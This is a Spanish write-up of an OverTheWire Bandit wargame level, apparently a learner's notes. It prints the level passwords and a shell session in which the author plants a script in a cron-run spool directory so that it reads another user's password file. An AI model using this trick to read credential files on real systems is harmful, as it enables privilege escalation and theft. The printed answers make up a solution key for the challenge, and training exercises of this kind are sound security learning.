# Retos Bandit

## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso al nivel
***Usuario: bandit23
Contraseña: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Solucion
```bash

  Enjoy your stay!
  NOTA: Antes habia creado la carpeta Jager y como aun no se eliminaba el archivo temporar mas tarde regrese y volvi a abrir la misma carpeta.

bandit23@bandit:~$ cd /tmp/Jager
bandit23@bandit:/tmp/Jager$ ls
bandit23@bandit:/tmp/Jager$ ls -la
total 120
drwxrwxr-x  2 bandit23 bandit23   4096 Mar  1 02:05 .
drwxrwx-wt 86 root     root     114688 Mar  1 03:05 ..
bandit23@bandit:/tmp/Jager$ cat bandit23
cat: bandit23: No such file or directory
bandit23@bandit:/tmp/Jager$ cd bandit23
-bash: cd: bandit23: No such file or directory
bandit23@bandit:/tmp/Jager$ echo "cat /etc/bandit_pass/bandit24  >> /tmp/Jager/PassPlease" > MeinScript.sh
bandit23@bandit:/tmp/Jager$ chmod 777 MeinScript.sh 
bandit23@bandit:/tmp/Jager$ cat MeinScript.sh 
cat /etc/bandit_pass/bandit24  >> /tmp/Jager/PassPlease
bandit23@bandit:/tmp/Jager$ cat /etc/bandit_pass/bandit24 >> /tmp/Jager/PassPlease
cat: /etc/bandit_pass/bandit24: Permission denied
bandit23@bandit:/tmp/Jager$ touch PassPlease 
bandit23@bandit:/tmp/Jager$ chmod 666 PassPlease 
bandit23@bandit:/tmp/Jager$ cp MeinScript.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/MeinScript.sh': Operation not permitted
bandit23@bandit:/tmp/Jager$ cat MeinScript.sh
cat /etc/bandit_pass/bandit24  >> /tmp/Jager/PassPlease
bandit23@bandit:/tmp/Jager$ chmod +x MeinScript.sh 
bandit23@bandit:/tmp/Jager$ touch PassPlease 
bandit23@bandit:/tmp/Jager$ chmod 666 PassPlease 
bandit23@bandit:/tmp/Jager$ ls -la
total 124
drwxrwxr-x  2 bandit23 bandit23   4096 Mar  1 03:17 .
drwxrwx-wt 99 root     root     114688 Mar  1 03:26 ..
-rwxrwxrwx  1 bandit23 bandit23     56 Mar  1 03:15 MeinScript.sh
-rw-rw-rw-  1 bandit23 bandit23      0 Mar  1 03:25 PassPlease
bandit23@bandit:/tmp/Jager$ cp MeinScript.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/Jager$ ls -la
total 124
drwxrwxr-x  2 bandit23 bandit23   4096 Mar  1 03:17 .
drwxrwx-wt 99 root     root     114688 Mar  1 03:26 ..
-rwxrwxrwx  1 bandit23 bandit23     56 Mar  1 03:15 MeinScript.sh
-rw-rw-rw-  1 bandit23 bandit23      0 Mar  1 03:25 PassPlease
bandit23@bandit:/tmp/Jager$ cat PassPlease 
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/Jager$ 

```

## Notas adicionales

## Referencias

